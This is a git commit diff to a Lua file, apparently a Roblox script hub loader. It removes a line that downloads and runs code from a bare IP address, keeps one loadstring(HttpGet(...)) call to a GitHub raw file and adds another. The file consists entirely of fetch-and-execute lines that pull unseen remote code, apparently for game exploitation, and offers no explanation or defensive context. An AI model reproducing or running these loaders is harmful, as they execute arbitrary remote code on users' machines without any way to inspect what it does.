7fe489e8f7d6074ee50991e8645d5066c9cba12c
ZephyrHub1 <quanghaha10092008@gmail.com>
2025-09-15 19:50:59 +0700

    Update Main.lua

--- Main.lua
+++ Main.lua
@@ -1,3 +1,2 @@
-ID="b5bd87ab-c631-494c-9b65-aa0f5b823563";
-loadstring(game:HttpGet("http://5.129.217.87:3910/cdn/loader.luau"))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/MoziIOnTop/MoziIHub/refs/heads/main/Alr"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/quangliz11/lolohahaha/refs/heads/main/cacbeo"))()
